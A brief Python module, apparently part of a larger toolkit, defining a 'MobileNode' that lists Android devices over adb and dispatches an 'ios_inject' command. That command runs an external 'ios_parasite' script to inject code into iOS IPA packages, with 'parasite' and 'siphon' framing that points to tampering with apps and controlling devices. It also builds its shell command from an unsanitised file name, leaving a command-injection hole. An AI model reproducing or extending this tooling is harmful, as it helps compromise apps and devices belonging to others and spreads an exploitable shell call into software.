# -*- coding: utf-8 -*-
from .base_node import BaseNode
import subprocess
import json

class MobileNode(BaseNode):
    """
    عقدة الهاتف المحمول (Fleet): السيطرة المادية على الأساطيل.
    """
    def handle_event(self, event):
        etype = event["type"]
        data = event["data"]

        if etype == "list_devices":
            print("📱 [MOBILE] Probing material fleet nodes...")
            out = subprocess.getoutput("adb devices")
            self.core.emit("device_list", {"devices": out})
            
        elif etype == "ios_inject":
            ipa = data.get("ipa")
            print(f"🦠 [PARASITE] Injecting Sovereign DNA into iOS IPA: {ipa}")
            # استدعاء محرك الطفيلي المادي
            out = subprocess.getoutput(f"python3 ai-engine/integrations/ios_parasite.py inject {ipa}")
            self.core.emit("ios_injection_complete", {"ipa": ipa, "output": out})

    def can_handle(self, cmd):
        return cmd in ["list_devices", "ios_inject", "mobile", "siphon"]
